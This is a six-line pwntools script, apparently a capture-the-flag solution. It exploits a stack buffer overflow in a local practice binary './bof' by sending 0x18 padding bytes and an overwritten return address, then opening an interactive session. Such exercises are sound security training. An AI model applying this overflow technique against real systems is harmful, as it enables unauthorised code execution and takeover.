from pwn import*
r = process("./bof")
shellcode = "A"*0x18+p64(0x400607)
r.recvline()
r.sendline(shellcode)
r.interactive()
